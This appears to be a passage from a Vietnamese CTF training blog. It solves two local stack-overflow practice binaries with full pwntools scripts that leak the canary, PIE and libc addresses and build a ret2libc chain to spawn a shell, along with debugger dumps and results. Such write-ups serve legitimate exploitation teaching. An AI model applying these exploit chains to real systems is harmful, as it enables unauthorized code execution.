0x0000000000401106 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x000000000040117d : pop rbp ; ret
0x000000000040119f : pop rdi ; ret
0x000000000040119a : push rbp ; mov rbp, rsp ; push rdi ; pop rdi ; ret
0x000000000040119e : push rdi ; pop rdi ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040123f : sub eax, 0xc9fffffe ; ret
0x000000000040128d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040128c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401103 : test eax, eax ; je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401145 : test eax, eax ; je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax


</code></pre>
<p>đáng ra để gọi shell ở đây thì mình sẽ cần :</p>
<pre><code class="language-shell">mov qword ptr [r14], r15 ; ret
systemcall

</code></pre>
<p>Để gọi shell. hay nếu dùng libc thì có thể leak runtime address với <strong>printf(%s)</strong> tuy nhiên cần đưa địa chỉ got của func vào rsi, do rdi trỏ đến &quot;%s&quot;, nhưng chả có gadget nào để <strong>pop rsi</strong>.</p>
<p>Cơ mà mình nghĩ đến việc, có thể leak địa chỉ trên stack với <strong>%p%p%p%p%p</strong>, cơ mà với mục đích tương tự thì ta có thể làm với <strong>read</strong>. Nên mình sẽ vào check stack xem có địa chỉ hàm nào k.</p>
<pre><code class="language-shell">pwndbg&gt; stack 100
00:0000│ rax rsi rsp 0x7fffffffdfb0 —▸ 0x7ffff7fa3600 (_IO_file_jumps) ◂— 0x0
01:0008│             0x7fffffffdfb8 —▸ 0x7ffff7e1762d (_IO_file_setbuf+13) ◂— test rax, rax
02:0010│             0x7fffffffdfc0 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│             0x7fffffffdfc8 —▸ 0x7ffff7e0e5ff (setbuffer+191) ◂— test dword ptr [rbx], 0x8000
04:0020│             0x7fffffffdfd0 ◂— 0x0
05:0028│             0x7fffffffdfd8 ◂— 0x0
06:0030│             0x7fffffffdfe0 —▸ 0x7fffffffe000 ◂— 0x1
07:0038│             0x7fffffffdfe8 ◂— 0xc2e8a41c66979000
08:0040│ rbp         0x7fffffffdff0 —▸ 0x7fffffffe000 ◂— 0x1
09:0048│             0x7fffffffdff8 —▸ 0x40127f (main+58) ◂— mov eax, 0
0a:0050│             0x7fffffffe000 ◂— 0x1
0b:0058│             0x7fffffffe008 —▸ 0x7ffff7db6d90 (__libc_start_call_main+128) ◂— mov edi, eax
0c:0060│             0x7fffffffe010 ◂— 0x0
0d:0068│             0x7fffffffe018 —▸ 0x401245 (main) ◂— endbr64
0e:0070│             0x7fffffffe020 ◂— 0x100000000
0f:0078│             0x7fffffffe028 —▸ 0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
10:0080│             0x7fffffffe030 ◂— 0x0
11:0088│             0x7fffffffe038 ◂— 0x684f04992bfd6bfd
12:0090│             0x7fffffffe040 —▸ 0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
13:0098│             0x7fffffffe048 —▸ 0x401245 (main) ◂— endbr64

</code></pre>
<p>thì mình để ý thấy có thằng <strong>setbuffer+191</strong> chỉ cần nhập 24 bytes là tới, nên là chỉ việc leak ra xong trừ đi 191 là ra được địa chỉ hàm ngon lành. Cơ mà có 1 vấn đề. Hơi khó hiểu tí, là lúc này thì là <strong>+191</strong> nhưng lúc mình viết script xong attach gdb vào chạy vào <strong>x/s</strong> địa chỉ được leak ra thì nó là <strong>+150</strong> nên trong script thay vì <strong>-191</strong> thì mình <strong>-150</strong> tức là <strong>0x96</strong></p>
<p>Sau khi leak được runtime address của hàm <strong>setbuffer</strong>, thì mình có thể tính được <strong>libc_base = addr_setbuf - setbuf_offset</strong>. Sau đó tính addr của <strong>system, &quot;/bin/sh&quot;</strong> dưạ trên offset và libc_base. Xong rồi thì với lần nhập tiếp theo mình sẽ gửi payload nhầm lấy shell như sau:</p>
<p><strong>payload = <em><strong>bypass canary</strong></em> + ret + pop_rdi_ret + binsh_addr + system_addr</strong></p>
<p>đưa addr của chuỗi /bin/sh vào rdi làm tham số thứ 1 và gọi system. tuy nhiên đây là kiến trúc 64bits nên là cần ret trước đó để tránh lỗi movaps:</p>
<blockquote>
<p>The MOVAPS issue</p>
<blockquote>
<p>If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.</p>
</blockquote>
</blockquote>
<p>Chúng ta có thể dùng các tool dưới cho việc tìm offset, ropgadget cần thiết, tuy nhiên ở script của mình sẽ tối ưu hóa hơn với pwntools:</p>
<pre><code class="language-shell">ROPgadget --binary file | grep &quot;somthing&quot;
readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;system&quot;
strings -tw /usr/lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;

</code></pre>
<h3 id="exploit-code-1"><a class="header" href="#exploit-code-1">Exploit code</a></h3>
<h4 id="exploit-code-ver1"><a class="header" href="#exploit-code-ver1">Exploit code ver1</a></h4>
<pre><code class="language-python">from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

payload1 = b&quot;a&quot;*56
r.sendlineafter(b&quot;Type the password: &quot;,payload1)

r.recvline()

canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
canary += b&quot;\x00&quot;*(8 - len(canary))
log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))

main = binary.symbols['main'] 
ret = rop.find_gadget(['ret'])[0] 


payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p64(main+53)
r.sendlineafter(b&quot;Retype: &quot;,payload2)

payload3 = b&quot;a&quot;*248
r.sendlineafter(b&quot;Type the password:&quot;,payload3)
r.recvline()

res = r.recv().split(b&quot;\nRetype&quot;)[0] 
res += b&quot;\x00&quot;*(8 - len(res))
leak = (u64(res) &lt;&lt; 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info(&quot;libc base addr : &quot; + hex(libc_base)) 


system_offset = libc.symbols['system'] #
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info(&quot;system addr : &quot; + hex(system_addr)) 
log.info(&quot;/bin/sh addr : &quot; + hex(binsh_addr)) 

junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()

</code></pre>
<h4 id="result-ver1"><a class="header" href="#result-ver1">Result ver1</a></h4>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_NOPIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 25200
[*] Leaked canary: 0xa5bb53678c3c3100
[*] libc base addr : 0x7f8adb24b000
[*] system addr : 0x7f8adb29bd60
[*] /bin/sh addr : 0x7f8adb423698
[*] Switching to interactive mode
$ ls
core  exploit.py  leak.py  passStore_NOPIE

</code></pre>
<h4 id="exploit-code-ver2"><a class="header" href="#exploit-code-ver2">Exploit code ver2</a></h4>
<pre><code class="language-python">from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#payload leak canary
payload1 = b&quot;a&quot;*56
r.sendline(payload1)

print(r.recvline())

canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
canary += b&quot;\x00&quot;*(8 - len(canary))
log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))

main = binary.symbols['main'] #0x0000000000401245
ret = rop.find_gadget(['ret'])[0] #0x000000000040101a

#payload to call main again
payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p64(ret) + p64(main)
r.sendlineafter(b&quot;Retype: &quot;,payload2)

#payload leak runtime address, to cal libc_base
payload3 = b&quot;a&quot;*23
r.sendlineafter(b&quot;Type the password:&quot;,payload3)
print(r.recvline())

res = r.recv().split(b&quot;\nRetype&quot;)[0].strip().ljust(8,b&quot;\x00&quot;)

print(str(hex(u64(res))))

leaked_runtime_addr = u64(res) - 0x96 #setbuf
leaked_offset = libc.symbols['_IO_setbuffer'] #0x0000000000081540

libc_base = leaked_runtime_addr - leaked_offset
log.info(&quot;libc base addr : &quot; + hex(leaked_runtime_addr))  


system_offset = libc.symbols['system'] #0x0000000000050d60
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

# payload get shell
junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()
</code></pre>
<h4 id="result-ver2"><a class="header" href="#result-ver2">Result ver2</a></h4>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_NOPIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 17374
b'Type the password: You typed aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[*] Leaked canary: 0x67c9f3b50b8b5800
b' You typed aaaaaaaaaaaaaaaaaaaaaaa\n'
0x7fe66ea595d6
[*] libc base addr : 0x7fe66ea59540
[*] Switching to interactive mode
$ ls
core        passStore_NOPIE     passStore_NOPIE.id2
exploit.py  passStore_NOPIE.id0  passStore_NOPIE.nam
leak.py     passStore_NOPIE.id1  passStore_NOPIE.til
$

</code></pre>
<h2 id="training-leak-pie-canary"><a class="header" href="#training-leak-pie-canary">training-leak-pie-canary</a></h2>
<p><a href="https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/passStore_PIE">binary file and exploit code</a></p>
<h3 id="file-2"><a class="header" href="#file-2">file</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ file passStore_PIE
passStore_PIE: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=269e6bec9af906e772b2b3f1e0b2f1ea8e9aeaac, for GNU/Linux 3.2.0, not stripped

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ checksec passStore_PIE
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

</code></pre>
<h3 id="source-1"><a class="header" href="#source-1">Source</a></h3>
<pre><code class="language-c">unsigned __int64 passStore()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf(&quot;Type the password: &quot;);
  read(0, buf, 0x300uLL);
  printf(&quot;You typed %s\n&quot;, buf);
  printf(&quot;Retype: &quot;);
  read(0, buf, 0x300uLL);
  return v2 - __readfsqword(0x28u);
}

</code></pre>
<h3 id="main-asm"><a class="header" href="#main-asm">main asm</a></h3>
<pre><code class="language-asm">pwndbg&gt; disass main
Dump of assembler code for function main:
   0x0000555555555258 &lt;+0&gt;:     endbr64
   0x000055555555525c &lt;+4&gt;:     push   rbp
   0x000055555555525d &lt;+5&gt;:     mov    rbp,rsp
   0x0000555555555260 &lt;+8&gt;:     mov    rax,QWORD PTR [rip+0x2db9]        # 0x555555558020 &lt;stdin@GLIBC_2.2.5&gt;
   0x0000555555555267 &lt;+15&gt;:    mov    esi,0x0
   0x000055555555526c &lt;+20&gt;:    mov    rdi,rax
   0x000055555555526f &lt;+23&gt;:    call   0x555555555090 &lt;setbuf@plt&gt;
   0x0000555555555274 &lt;+28&gt;:    mov    rax,QWORD PTR [rip+0x2d95]        # 0x555555558010 &lt;stdout@GLIBC_2.2.5&gt;
   0x000055555555527b &lt;+35&gt;:    mov    esi,0x0
   0x0000555555555280 &lt;+40&gt;:    mov    rdi,rax
   0x0000555555555283 &lt;+43&gt;:    call   0x555555555090 &lt;setbuf@plt&gt;
   0x0000555555555288 &lt;+48&gt;:    mov    eax,0x0
   0x000055555555528d &lt;+53&gt;:    call   0x5555555551b7 &lt;passStore&gt;
   0x0000555555555292 &lt;+58&gt;:    mov    eax,0x0
   0x0000555555555297 &lt;+63&gt;:    pop    rbp
   0x0000555555555298 &lt;+64&gt;:    ret
End of assembler dump.

</code></pre>
<p>Chall này chỉ khác chall trước mỗi cái Pie được bật. </p>
<p>Cũng tương tự như chall trước đó ở phần leak canary. Sau payload1 làm nhiệm vụ leak canary thì đến payload 2 ta sẽ điều khiển luồng thực thi để sao cho tiếp tục nhập được payload. Giờ thì phải xem xem <strong>passStore()</strong> sẽ ret về đâu:</p>
<pre><code class="language-shell">────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x555555555257 &lt;passStore+160&gt;                 ret
           &lt;0x555555555292; main+58&gt;
    ↓
   0x555555555292 &lt;main+58&gt;                       mov    eax, 0
   0x555555555297 &lt;main+63&gt;                       pop    rbp
   0x555555555298 &lt;main+64&gt;                       ret
    ↓
   0x7ffff7db6d90 &lt;__libc_start_call_main+128&gt;    mov    edi, eax
   0x7ffff7db6d92 &lt;__libc_start_call_main+130&gt;    call   exit
 &lt;exit&gt;

</code></pre>
<p>ta có thể thấy là ret về lệnh ngay sau lệnh call passStore() ở hàm main </p>
<pre><code class="language-python">   0x000055555555528d &lt;+53&gt;:    call   0x5555555551b7 &lt;passStore&gt;
   0x0000555555555292 &lt;+58&gt;:    mov    eax,0x0

</code></pre>
<p>và 2 lệnh này chỉ khác nhau mỗi 1 byte cuối cùng. Oke vậy ta sẽ có ý tưởng ghi đè byte cuối cùng để ret về. Phải làm thế mà không ghi đè cả addr 8 bytes là do <em><strong>Pie</strong></em> đang được bật, pie_base luôn đổi.</p>
<p>Ở chall NoPie trước đó mình giải thì mình call back main, trước đó thì có gadget ret, để tránh movaps trong kiến trúc 64bits. Tuy nhiên còn 1 cách tránh stack alignment nữa là. Thay vì call thẳng cái địa chỉ của func như call ngay <strong>main, hay các hàm như printf, read, system</strong>, thì ta có thể call <strong>main + x</strong> miễn sao thỏa mãn rsp và rbp đã được update lại:</p>
<pre><code class="language-shell">   0x0000555555555258 &lt;+0&gt;:     endbr64
   0x000055555555525c &lt;+4&gt;:     push   rbp
   0x000055555555525d &lt;+5&gt;:     mov    rbp,rsp
   0x0000555555555260 &lt;+8&gt;:     mov    rax,QWORD PTR [rip+0x2db9]

</code></pre>
<p>Ví dụ ở đây thay vì call back <strong>main</strong>, ta sẽ call <strong>main + 8</strong> thế là bypass việc phải có gadget ret đằng trước. Mình đã vướn ở đây rất lâu ==&quot;, và mình cũng đã update thêm cách này ở chall NoPie</p>
<p>Lý do mà phải tránh gadget ret đằng trước ở chall này mà chall trước lại k cần lăn tăn như vậy là vì, chall này Pie được bật mà hiện giờ thì vẫn chưa leak được pie_base, nên là các gadget toàn offset thoi ==&quot;. </p>
<p>À, còn 1 vấn đề nữa là ở payload này, mình phải dùng <strong>send(payload)</strong> thay vì sendline() là vì với sendline thì sẽ gửi thêm <strong>&quot;\n&quot;</strong> làm ghi đè mất byte kế cuối thành <strong>0x0a</strong>.</p>
<p>Sau khi pass được chỗ này thì mọi thứ trông dễ dàng hơn. giờ thì đến việc ta xem phải leak libc trước hay pie_base trước. Tại vì sau khi ta ghi đè trên stack thì nó vẫn ở đó, có nghĩa là payload ghi đè giá trị trên stack có chủ đích về sau <strong>buộc</strong> phải dài hơn payload trước đấy, chứ không thì chẳng thể leak được gì, do đều bị ghi đè cả rồi. </p>
<p>chall NoPie trước ở payload thứ 3 này, mình đã leak addr của setbuffer ở stack thứ 4, tuy nhiên giờ có 1 vấn đề sau khi không call lại <strong>main</strong> mà call <strong>main+53</strong> thì stack vẫn như cũ, tức là các stack bị ghi đè vẫn còn đó, nó đã ghi đè nốt chỗ stack mà ở chall trước mình leak setbuffer, nên giờ mình cần leak addr ở stack cao hơn.</p>
<p>Hơn nữa muốn leak pie_base thì cần phải leak được địa chỉ của các hàm như này:</p>
<pre><code class="language-python">0x0000555555555000  _init
0x0000555555555070  __cxa_finalize@plt
0x0000555555555080  __stack_chk_fail@plt
0x0000555555555090  setbuf@plt
0x00005555555550a0  printf@plt
0x00005555555550b0  read@plt
0x00005555555550c0  _start
0x00005555555550f0  deregister_tm_clones
0x0000555555555120  register_tm_clones
0x0000555555555160  __do_global_dtors_aux
0x00005555555551a0  frame_dummy
0x00005555555551b7  passStore
0x0000555555555258  main
0x000055555555529c  _fini

</code></pre>
<p>Stack sau khi send payload2 để quay lại <strong>main+53</strong></p>
<pre><code class="language-shell">pwndbg&gt; stack 50
00:0000│ rsi rsp 0x7fff14ebfa60 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
... ↓            6 skipped
07:0038│         0x7fff14ebfa98 ◂— 0x8dda103545364600
08:0040│ rbp     0x7fff14ebfaa0 ◂— 0x6161616161616161 ('aaaaaaaa')
09:0048│         0x7fff14ebfaa8 —▸ 0x55877522e292 (main+58) ◂— mov eax, 0
0a:0050│         0x7fff14ebfab0 ◂— 0x1
0b:0058│         0x7fff14ebfab8 —▸ 0x7f359a743d90 (__libc_start_call_main+128) ◂— mov edi, eax
0c:0060│         0x7fff14ebfac0 ◂— 0x0
0d:0068│         0x7fff14ebfac8 —▸ 0x55877522e258 (main) ◂— endbr64
0e:0070│         0x7fff14ebfad0 ◂— 0x100000000
0f:0078│         0x7fff14ebfad8 —▸ 0x7fff14ebfbc8 —▸ 0x7fff14ec1346 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
10:0080│         0x7fff14ebfae0 ◂— 0x0
11:0088│         0x7fff14ebfae8 ◂— 0x8043fcf311f93ffc
12:0090│         0x7fff14ebfaf0 —▸ 0x7fff14ebfbc8 —▸ 0x7fff14ec1346 ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
13:0098│         0x7fff14ebfaf8 —▸ 0x55877522e258 (main) ◂— endbr64
14:00a0│         0x7fff14ebfb00 —▸ 0x558775230da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55877522e160 (__do_global_dtors_aux) ◂— endbr64
15:00a8│         0x7fff14ebfb08 —▸ 0x7f359a985040 (_rtld_global) —▸ 0x7f359a9862e0 —▸ 0x55877522d000 ◂— 0x10102464c457f
16:00b0│         0x7fff14ebfb10 ◂— 0x7fbdd524e47b3ffc
17:00b8│         0x7fff14ebfb18 ◂— 0x7e28c81b6b733ffc
18:00c0│         0x7fff14ebfb20 ◂— 0x0
... ↓            4 skipped
1d:00e8│         0x7fff14ebfb48 ◂— 0x8dda103545364600
1e:00f0│         0x7fff14ebfb50 ◂— 0x0
1f:00f8│         0x7fff14ebfb58 —▸ 0x7f359a743e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159]
20:0100│         0x7fff14ebfb60 —▸ 0x7fff14ebfbd8 —▸ 0x7fff14ec1397 ◂— 'SHELL=/bin/bash'
21:0108│         0x7fff14ebfb68 —▸ 0x558775230da8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55877522e160 (__do_global_dtors_aux) ◂— endbr64
22:0110│         0x7fff14ebfb70 —▸ 0x7f359a9862e0 —▸ 0x55877522d000 ◂— 0x10102464c457f
23:0118│         0x7fff14ebfb78 ◂— 0x0
24:0120│         0x7fff14ebfb80 ◂— 0x0

</code></pre>
<pre><code class="language-python">&gt;&gt;&gt; 0x7fff14ebfac8 - 0x7fff14ebfa60
104
&gt;&gt;&gt; 0x7fff14ebfaa8 - 0x7fff14ebfa60
72
&gt;&gt;&gt; 0x7fff14ebfb58 - 0x7fff14ebfa60
248
</code></pre>
<p>Như đã thấy thì để leak libc cần tới <em><strong>248 bytes</strong></em>, nếu ghi đè hết <em><strong>248 bytes</strong></em> trước thì ghi đè nốt mấy cái khác, do đó ta sẽ libc leak sau khi leak và calc pie_base( mình cũng đã update thêm cách solve chall NoPie. Tương tự như chall này).</p>
<p>Thêm nữa thì stack <strong>0d:0068</strong> khá là đẹp với <strong>main</strong> tuy nhiên để đến đc đó cần tới <em><strong>104 bytes</strong></em>, mà chúng ta cần phải nhớ là payload2 để ret về <strong>main+53</strong> để tạo vòng lặp cho việc exploit thì chỉ có <em><strong>72 bytes</strong></em>. do đó để tránh lỗi thì ta sẽ chọn stack <strong>09:0048</strong>, tức là leak đc <strong>main+58</strong>, chỉ việc trừ <em><strong>58</strong></em> đi là có được main addr</p>
<p>Sau khi có được <em>main_addr</em> thì ta trừ đi <em>offset của main func</em> sẽ được pie_base, có pie_base thì sẽ tính được addr của các gadget  như <strong>ret, pop rdi</strong> cần thiết cho việc lấy shell.</p>
<p>Sau khi đã xong việc leak pie với payload3. Thì <strong>payload4 = payload2</strong> để 1 lần nữa call lại <strong>main+53</strong> tức là gọi <strong>passStore()</strong> </p>
<p>Tiếp tục leak libc với <em><strong>payload5 = 248 bytes</strong></em></p>
<p>payload6 sẽ giống chall trước đó, chỉ khác 1 chỗ là, ta cần tính addr của các gadget dựa vào pie_base. rồi lấy shell như trc.</p>
<h3 id="exploit-code-2"><a class="header" href="#exploit-code-2">exploit code</a></h3>
<pre><code class="language-python">from pwn import *

binary = ELF('./passStore_PIE')
libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;)
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#Leak canary
payload1 = b&quot;a&quot;*56
r.sendlineafter(b&quot;Type the password: &quot;,payload1)
r.recvline()

canary = b&quot;\x00&quot;  +  r.recv(7).split(b&quot;\n&quot;)[0] 
canary += b&quot;\x00&quot;*(8 - len(canary))
log.info(&quot;Leaked canary: &quot; + str(hex(u64(canary))))

#Call back main+53 &lt;=&gt; passStore()
payload2 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p8(0x8d)
r.sendafter(b&quot;Retype: &quot;,payload2)

#leak main+58 to calc pie_base
payload3 = b&quot;a&quot;*72
r.sendafter(b&quot;Type the password:&quot;,payload3)

res = r.recvline().split(b&quot;a&quot;*72)[1] 
res = res.split(b&quot;\n&quot;)[0]
res += b&quot;\x00&quot;*(8 - len(res))

main_addr_pie = u64(res) - 0x3a #58
log.info(&quot;Main addr (pie) leak : &quot; + hex(main_addr_pie)) 
main_offset_pie = binary.symbols['main']
pie_base = main_addr_pie - main_offset_pie
log.info(&quot;Main offset pie : &quot; + hex(main_offset_pie)) 
log.info(&quot;Pie base addr : &quot; + hex(pie_base)) 

#call back main+53 &lt;=&gt; passStore()
payload4 = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 + p8(0x8d)
r.sendafter(b&quot;Retype: &quot;,payload4)

#leak and calc libc
payload5 = b&quot;a&quot;*248
r.sendlineafter(b&quot;Type the password:&quot;,payload5)
r.recvline()

res = r.recv().split(b&quot;\nRetype&quot;)[0] 
res += b&quot;\x00&quot;*(8 - len(res))
leak = (u64(res) &lt;&lt; 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info(&quot;Libc base addr : &quot; + hex(libc_base)) 

system_offset = libc.symbols['system'] 
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_offset = rop.find_gadget(['ret'])[0] 

pop_rdi_ret_addr = pie_base + pop_rdi_ret_offset
ret_addr = pie_base + ret_offset
log.info(&quot;pop rdi ; ret addr : &quot; + hex(pop_rdi_ret_addr)) 
log.info(&quot;ret addr : &quot; + hex(ret_addr)) 

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info(&quot;system addr : &quot; + hex(system_addr)) 
log.info(&quot;/bin/sh addr : &quot; + hex(binsh_addr)) 

#get shell
junk = b&quot;a&quot;*56 + p64(u64(canary)) + b&quot;a&quot;*8 
payload6 = junk + p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload6)
r.interactive()

</code></pre>
<h3 id="result-1"><a class="header" href="#result-1">result</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_PIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_PIE/passStore_PIE': pid 27696
[*] Leaked canary: 0xfb6bcbd3beea1c00
[*] Main addr (pie) leak : 0x560b4cfbb258
[*] Main offset pie : 0x1258
[*] Pie base addr : 0x560b4cfba000
[*] Libc base addr : 0x7f0b4bbce000
[*] pop rdi ; ret addr : 0x560b4cfbb1b2
[*] ret addr : 0x560b4cfbb01a
[*] system addr : 0x7f0b4bc1ed60
[*] /bin/sh addr : 0x7f0b4bda6698
[*] Switching to interactive mode
$ whoami
hjn4
$

</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next" href="../../../blogs/Assembly/Session_1.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next" href="../../../blogs/Assembly/Session_1.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
